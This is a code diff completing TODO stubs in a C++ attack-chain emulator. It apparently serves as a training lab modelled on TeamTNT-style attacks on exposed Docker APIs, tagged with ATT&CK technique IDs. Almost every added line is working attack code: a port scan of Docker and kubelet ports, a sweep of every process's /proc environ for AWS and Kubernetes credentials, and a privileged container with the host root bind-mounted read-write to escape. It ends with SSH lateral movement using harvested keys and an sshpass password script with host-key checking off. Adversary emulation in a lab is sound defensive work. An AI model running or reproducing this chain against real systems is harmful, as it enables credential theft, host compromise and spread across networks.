@@ -42,7 +42,9 @@ void AttackChain::run_all() const {
 void AttackChain::step01_scan() const {
   log(">>> Step 01 — scan targets (T1595 / T1046)");
   const std::vector<ScanTarget> targets = {
-      // TODO: add scan targets here, as objects of `ScanTarget` structure (ref: include/net_scanner.hpp)
+      {"docker-api", {2375, 10250, 10255}},
+      {"victim-app", {80}},
+      {"metadata-sim", {80}},
   };
 
   const auto results = scan_targets(targets);
@@ -61,10 +63,17 @@ void AttackChain::step02_probe_docker() const {
   log("Probing Docker API at " + cfg_.docker_base_url());
   if (!docker_.ping()) die("Docker API unreachable — is the lab running?");
 
-  // TODO: get list of docker containers running
+  const auto containers = docker_.list_containers(true);
   std::ostringstream ps;
   ps << "ID\tIMAGE\tSTATUS\tNAMES\n";
-  // TODO: put container information into string stream
+  if (containers.is_array()) {
+    for (const auto& c : containers) {
+      ps << c.value("Id", "").substr(0, 12) << '\t' << c.value("Image", "") << '\t'
+         << c.value("Status", "") << '\t';
+      if (c.contains("Names") && !c["Names"].empty()) ps << c["Names"][0].get<std::string>();
+      ps << '\n';
+    }
+  }
   write_file(staging("docker-ps.txt"), ps.str());
 
   const auto ver = docker_.version();
@@ -84,7 +93,27 @@ void AttackChain::step03_harvest_credentials() const {
   if (meta_role.ok()) creds << meta_role.body << '\n';
 
   creds << "=== /proc environ ===\n";
-  // TODO: iterate over /proc, and find creds in process specific environment variables
+  if (auto* dir = opendir("/proc")) {
+    while (auto* ent = readdir(dir)) {
+      if (ent->d_name[0] < '0' || ent->d_name[0] > '9') continue;
+      const std::filesystem::path env_path = std::filesystem::path("/proc") / ent->d_name / "environ";
+      std::ifstream in(env_path, std::ios::binary);
+      if (!in) continue;
+      std::string data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+      if (data.find("AWS_") == std::string::npos && data.find("KUBERNETES_") == std::string::npos)
+        continue;
+      creds << "--- " << env_path.string() << " ---\n";
+      for (size_t i = 0; i < data.size();) {
+        const size_t end = data.find('\0', i);
+        const std::string line = data.substr(i, end == std::string::npos ? data.size() - i : end - i);
+        if (line.find("AWS_") != std::string::npos || line.find("KUBERNETES_") != std::string::npos)
+          creds << line << '\n';
+        if (end == std::string::npos) break;
+        i = end + 1;
+      }
+    }
+    closedir(dir);
+  }
 
   log("Harvesting victim files via Docker API (T1552.001 / T1552.004)");
   const std::string victim_id = docker_.find_container_by_name("victim-app");
@@ -108,7 +137,16 @@ void AttackChain::step04_container_discovery() const {
   write_file(staging("images.txt"), docker_.list_images().dump(2));
 
   log("Pull and run public image (T1204.003)");
-  // TODO: download and run container image
+  docker_.pull_image("busybox", "1.36");
+  write_file(staging("pull.log"), "pull busybox:1.36 requested via Docker API\n");
+
+  nlohmann::json run_spec;
+  run_spec["Image"] = "busybox:1.36";
+  run_spec["Cmd"] = nlohmann::json::array(
+      {"sh", "-c", "echo '[T1204] malicious image executed (lab)'; sleep 2"});
+  const std::string run_id = docker_.run_container("teamtnt-pulled-lab", run_spec);
+  write_file(staging("image-run.log"),
+              run_id.empty() ? "container run failed\n" : "started teamtnt-pulled-lab: " + run_id + "\n");
 
   const auto containers = docker_.list_containers(false);
   if (containers.is_array() && !containers.empty()) {
@@ -120,9 +158,18 @@ void AttackChain::step04_container_discovery() const {
 
 void AttackChain::step05_escape_and_deploy() const {
   log(">>> Step 05 — escape and deploy (T1611 / T1105)");
-  // TODO: run container, and access host filesystem
+  nlohmann::json spec;
+  spec["Image"] = "busybox:1.36";
+  spec["Cmd"] = nlohmann::json::array({"sleep", "3600"});
+  spec["HostConfig"]["Privileged"] = true;
+  spec["HostConfig"]["Binds"] = nlohmann::json::array({"/:/host:rw"});
 
-  const std::string id = "";
+  const std::string id = docker_.run_container("teamtnt-escape-lab", spec);
+  if (id.empty()) {
+    warn("Failed to start escape container");
+    return;
+  }
+
   std::ostringstream escape_out;
   if (!id.empty()) {
     escape_out << docker_.exec_output(id, {"sh", "-c",
@@ -133,7 +180,8 @@ void AttackChain::step05_escape_and_deploy() const {
   write_file(staging("escape-output.txt"), escape_out.str());
 
   log("Ingress tool transfer (T1105)");
-  // TODO: download a file
+  const auto dl = http_.get("https://raw.githubusercontent.com/torvalds/linux/master/README");
+  write_file(staging("helper.sh"), dl.ok() ? dl.body : "# mock payload\n");
   log("Escape lab container: teamtnt-escape-lab");
 }
 
@@ -147,13 +195,38 @@ void AttackChain::step06_lateral_movement() const {
   const std::string target = cfg_.ssh_lateral_target;
 
   if (!key.empty()) {
-    // TODO: Run commands on remote host using SSH key based authentication
+    write_file(key_path, key);
+    chmod(key_path.c_str(), 0600);
+    log("SSH key extracted to " + key_path.string());
+
+    const std::string key_cmd =
+        "ssh -i " + key_path.string() +
+        " -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+        "devops@" +
+        target + " 'hostname; id' > " + staging("lateral-ssh-key.log").string() + " 2>&1";
+    if (run_command(key_cmd) == 0) {
+      log("SSH key lateral command succeeded (T1021.004)");
+    } else {
+      warn("SSH key lateral failed — is lateral-ssh-target running?");
+    }
   } else {
     warn("No SSH key in harvest; skipping key-based lateral");
   }
 
   if (!password.empty()) {
-    // TODO: Run command on remote host using SSH (username/password)
+    write_file(staging("lateral-ssh-password.sh"),
+               "#!/bin/bash\nexport SSHPASS='" + password + "'\n"
+               "sshpass -e ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
+               "devops@" +
+                   target + " 'hostname; id'\n");
+    chmod(staging("lateral-ssh-password.sh").c_str(), 0755);
+    const std::string pass_cmd = "bash " + staging("lateral-ssh-password.sh").string() + " > " +
+                                 staging("lateral-ssh-password.log").string() + " 2>&1";
+    if (run_command(pass_cmd) == 0) {
+      log("SSH password lateral command succeeded (T1021.004)");
+    } else {
+      warn("SSH password lateral failed — is sshpass installed and lateral-ssh-target running?");
+    }
   } else {
     warn("No SSH password in harvest; skipping password-based lateral");
   }
